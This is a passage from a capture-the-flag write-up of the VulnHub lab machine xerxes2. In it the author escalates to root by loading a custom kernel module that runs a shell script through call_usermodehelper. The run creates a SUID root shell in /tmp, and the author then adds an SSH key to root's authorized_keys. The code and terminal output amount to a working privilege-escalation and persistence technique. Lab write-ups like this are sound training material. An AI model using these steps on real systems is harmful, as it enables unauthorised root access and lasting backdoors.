[113593.419622] 	congratulations on beating xerxes2!
[113593.419623] 
[113593.419623] 	I hope you enjoyed it as much as I did making xerxes2. 
[113593.419624] 	xerxes1 has been described as 'weird' and 'left-field'
[113593.419625] 	and I hope that this one fits that description too :)
[113593.419625] 
[113593.419626] 	Many thanks to @TheColonial & @rasta_mouse for testing!
[113593.419626] 
[113593.419627] 	Ping me on #vulnhub for thoughts and comments!
[113593.419627] 
[113593.419628] 					  @barrebas, July 2014
[113593.419628] 

```


So, most people would go "I GOT THE FLAG !" and do a little dance. Probably along these lines

![](http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif)

But I wanted more - I actually wanted a root shell. I wonder if I can run shell scripts with a kernel module. Hmm... google ? I was drawn to [this article](http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html) which provided the following code

[c]
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>


static int __init usermodehelper_example_init(void)
{
	int ret = 0;
	char *argv[] = {"/home/arkeller/eth/paper/code/callee", "2", NULL };
	char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

	printk("usermodehelper: init\n");
	/* last parameter: 1 -> wait until execution has finished, 0 go ahead without waiting*/
	/* returns 0 if usermode process was started successfully, errorvalue otherwise*/
	/* no possiblity to get return value of usermode process*/
	ret = call_usermodehelper("/home/arkeller/eth/paper/code/callee", argv, envp, UMH_WAIT_EXEC);
	if (ret != 0)
		printk("error in call to usermodehelper: %i\n", ret);
	else
		printk("everything all right\n");
        return 0;
}

static void __exit usermodehelper_example_exit(void)
{
	printk("usermodehelper: exit\n");
}

module_init(usermodehelper_example_init);
module_exit(usermodehelper_example_exit);
MODULE_LICENSE("GPL");

```


I'm on the home straight here - lets modify this code to run a shell script instead (the shell script used is identical to that used earlier to get from delacroix to polito).

[c]
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>


static int __init usermodehelper_example_init(void)
{
        int ret = 0;
        char *argv[] = {"/home/korenchkin/runme.sh", "2", NULL };
        char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

        printk("usermodehelper: init\n");
        /* last parameter: 1 -> wait until execution has finished, 0 go ahead without waiting*/
        /* returns 0 if usermode process was started successfully, errorvalue otherwise*/
        /* no possiblity to get return value of usermode process*/
        ret = call_usermodehelper("/home/korenchkin/runme.sh", argv, envp, UMH_WAIT_EXEC);
        if (ret != 0)
                printk("error in call to usermodehelper: %i\n", ret);
        else
                printk("everything all right\n");
        return 0;
}

static void __exit usermodehelper_example_exit(void)
{
        printk("usermodehelper: exit\n");
}

module_init(usermodehelper_example_init);
module_exit(usermodehelper_example_exit);
MODULE_LICENSE("GPL");
```


I created another Makefile, compiled the module and loaded it


``` bash

korenchkin@xerxes2:~$ make -C /lib/modules/$(uname -r)/build M=/home/korenchkin/a modules
make: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae'
  CC [M]  /home/korenchkin/a/a.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/a/a.mod.o
  LD [M]  /home/korenchkin/a/a.ko
make: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae'
korenchkin@xerxes2:~$ sudo insmod a.ko
korenchkin@xerxes2:~$
```


![](http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif)


``` bash

korenchkin@xerxes2:~$ ls -l /tmp
total 244
-rwxr-xr-x 1 delacroix delacroix    55 Aug  6 16:15 123.sh
-rwsrwxrwx 1 root      root      97284 Aug  8 03:40 rootshell
-rwsrwxrwx 1 polito    polito    97284 Aug  6 16:15 shell
korenchkin@xerxes2:~/a$ /tmp/rootshell
# id
uid=1000(korenchkin) gid=1000(korenchkin) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
#

```


Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I'll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file


``` bash

root@pwk:~# ssh root@192.168.0.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@xerxes2:~# cat flag.txt
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 

	congratulations on beating xerxes2!

	I hope you enjoyed it as much as I did making xerxes2. 
	xerxes1 has been described as 'weird' and 'left-field'
	and I hope that this one fits that description too :)

	Many thanks to @TheColonial & @rasta_mouse for testing!

	Ping me on #vulnhub for thoughts and comments!

					  @barrebas, July 2014
root@xerxes2:~# 

```


![](http://www.awesomelyluvvie.com/wp-content/uploads/2013/01/CharlieBrownDance2.gif)
